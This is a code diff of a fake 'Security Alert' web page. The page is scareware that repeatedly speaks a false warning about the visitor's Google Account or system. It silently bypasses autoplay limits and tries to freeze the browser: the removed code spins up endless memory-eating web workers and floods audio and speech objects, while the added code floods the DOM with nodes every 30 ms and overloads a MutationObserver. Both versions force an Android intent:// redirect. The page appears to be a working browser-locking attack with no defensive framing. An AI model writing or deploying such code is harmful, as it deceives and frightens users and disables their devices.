@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Advanced Exploit Chain</title>
+<title>Security Alert - DOM Exhaustion Chain</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #000; min-height: 100vh; overflow: hidden; }
+  body { background: #000; min-height: 100vh; overflow: hidden; color: #fff; }
   iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
@@ -20,13 +20,13 @@
   // ============================================
   var CONFIG = {
     tts: {
-      text: "Critical Security Warning. Unauthorized access detected on your Google Account. Immediate verification required.",
+      text: "System Alert. DOM manipulation threshold exceeded. Immediate verification required.",
       lang: 'en-US',
       rate: 0.90,
       pitch: 1.0,
       volume: 1.0,
-      repeatInterval: 5000,
-      maxRepeats: 50
+      repeatInterval: 6000,
+      maxRepeats: 30
     },
     silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
   };
@@ -34,7 +34,7 @@
   var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
 
   // ============================================
-  // ADVANCED TTS ENGINE (NON-BLOCKING)
+  // TTS ENGINE
   // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
@@ -47,12 +47,6 @@
       u.pitch = CONFIG.tts.pitch;
       u.volume = CONFIG.tts.volume;
 
-      var voices = window.speechSynthesis.getVoices();
-      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
-      if (enVoice) u.voice = enVoice;
-
-      u.onstart = function () { console.log('[TTS] Active #' + state.ttsCount); };
-      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
       u.onend = function () {
         state.ttsCount++;
         if (state.ttsCount < CONFIG.tts.maxRepeats) {
@@ -72,18 +66,15 @@
   }
 
   // ============================================
-  // AUDIO CONTEXT UNLOCK & BYPASS
+  // AUDIO CONTEXT & SILENT BYPASS
   // ============================================
   function unlockAudioContext() {
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().catch(function(){});
-      }
+      if (ctx.state === 'suspended') { ctx.resume().catch(function(){}); }
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
       gain.gain.value = 0.0001;
-      osc.frequency.value = 20000;
       osc.connect(gain);
       gain.connect(ctx.destination);
       osc.start();
@@ -101,9 +92,6 @@
     } catch (e) {}
   }
 
-  // ============================================
-  // MAIN AUDIO SYNTHESIS
-  // ============================================
   function playMainAudio() {
     if (state.mainPlayed) return;
     state.mainPlayed = true;
@@ -111,84 +99,63 @@
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       var sr = ctx.sampleRate;
-      var dur = 2.5;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var buf = ctx.createBuffer(1, sr * 2, sr);
       var d = buf.getChannelData(0);
-
       for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 900 + (Math.floor(t * 6) % 2) * 450;
-        var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.25 * env;
+        d[i] = Math.sin(2 * Math.PI * 440 * (i / sr)) * 0.2;
       }
-
       var src = ctx.createBufferSource();
       src.buffer = buf;
       src.connect(ctx.destination);
       src.start();
       src.onended = startTTS;
-      setTimeout(startTTS, 3000);
+      setTimeout(startTTS, 2500);
     } catch (e) {
       startTTS();
     }
   }
 
   // ============================================
-  // UPGRADE: DATA URI WORKER POOL + RACE CONDITION & INTENT HIJACK
+  // VARIAN EKSPLOIT: DOM NODE FLOODING & MUTATION OBSERVER OVERLOAD
   // ============================================
-  function triggerAdvancedExploitChain() {
-    console.log("[!] Upgrading exploit chain without Blobs...");
+  function triggerDOMExhaustionChain() {
+    console.log("[!] Initiating DOM Node Flooding & Mutation Observer Overload...");
 
-    // 1. Mengganti Blob Worker dengan Data URI base64 worker untuk menghindari penggunaan URL.createObjectURL
+    // 1. Memasang Mutation Observer masif untuk memicu beban callback sinkron
     try {
-      var workerScript = "self.onmessage=function(e){while(true){var arr=new Uint8Array(1024*1024*50);for(var i=0;i<arr.length;i++){arr[i]=Math.random()*255;}}}";
-      var workerUri = "data:text/javascript;base64," + btoa(workerScript);
-      
-      for (var w = 0; w < 4; w++) {
-        var worker = new Worker(workerUri);
-        worker.postMessage('start');
-      }
-    } catch(err) {}
+      var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          // Memaksa komputasi ulang layout DOM secara terus-menerus
+          var dummy = document.body.offsetHeight;
+        });
+      });
+      observer.observe(document.body, { childList: true, subtree: true, attributes: true });
+    } catch(e) {}
 
-    // 2. High-Frequency AudioContext & SpeechSynthesis Queue Flood (Race Condition)
+    // 2. Membanjiri memori renderer menggunakan penambahan node DOM masif tanpa pembersihan
     setInterval(function() {
       try {
-        var tasks = [];
-        for (var i = 0; i < 100; i++) {
-          tasks.push(new Promise((resolve) => {
-            queueMicrotask(() => {
-              try {
-                for (var j = 0; j < 50; j++) {
-                  var ctx = new (window.AudioContext || window.webkitAudioContext)();
-                  var osc = ctx.createOscillator();
-                  var gain = ctx.createGain();
-                  osc.connect(gain);
-                  gain.connect(ctx.destination);
-                  osc.start(0);
-
-                  var u = new SpeechSynthesisUtterance("SECURITY_EXHAUSTION_NODE_" + Math.random());
-                  window.speechSynthesis.speak(u);
-                }
-              } catch(e) {}
-              resolve();
-            });
-          }));
+        var fragment = document.createDocumentFragment();
+        for (var i = 0; i < 5000; i++) {
+          var el = document.createElement('div');
+          el.textContent = "DOM_NODE_FLOOD_" + Math.random();
+          fragment.appendChild(el);
         }
-        Promise.all(tasks);
+        document.body.appendChild(fragment);
       } catch(e) {}
-    }, 25);
+    }, 30);
 
-    // 3. Agresif Deep Link / Intent Redirection Chaining
+    // 3. Delayed Deep Link / Intent Redirection Chaining
     setTimeout(function() {
       try {
-        console.log("[*] Forcing aggressive intent scheme redirect...");
+        console.log("[*] Forcing intent redirection...");
         window.location.replace("intent://security-alert#Intent;scheme=exploit;package=com.google.android.browser;end;");
       } catch(e) {}
-    }, 3000);
+    }, 4000);
   }
 
   // ============================================
-  // INISIALISASI BERTAHAP
+  // INISIALISASI
   // ============================================
   unlockAudioContext();
   trySilentAudio();
@@ -206,12 +173,11 @@
     if (!state.mainPlayed) playMainAudio();
     if (!state.ttsStarted) startTTS();
     
-    // EKSEKUSI EXPLOIT UPGRADE
-    triggerAdvancedExploitChain();
+    // EKSEKUSI VARIAN DOM EXHAUSTION
+    triggerDOMExhaustionChain();
     
   }, 1200);
 
-  // Auto Retry Handler
   var retryCount = 0;
   var retry = setInterval(function () {
     retryCount++;
@@ -221,7 +187,6 @@
     if (retryCount > 15) clearInterval(retry);
   }, 1500);
 
-  // Tab Visibility Watcher
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden && !state.mainPlayed) {
       setTimeout(playMainAudio, 50);
